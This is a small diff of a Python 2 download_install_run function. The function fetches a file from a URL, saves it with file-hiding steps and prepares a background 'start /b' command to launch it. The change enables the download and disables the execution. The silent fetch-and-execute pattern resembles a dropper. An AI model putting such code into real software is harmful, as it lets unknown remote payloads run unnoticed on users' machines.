@@ -11,7 +11,6 @@ def download_install_run(url, specialpath, fname):
     unhide_file(path)
     #Save and hide the file
     u = urllib2.urlopen(url)
-    return
     f = open(path, "wb")
     f.write(u.read())
     f.close()
@@ -22,7 +21,8 @@ def download_install_run(url, specialpath, fname):
     #Make a command to run the file
     command = "start /b %s"%win32api.GetShortPathName(path)
     print command
-    os.system(command)
+    return
+    #os.system(command)
     
         
 #Utility functions.  May be useful elsewhere
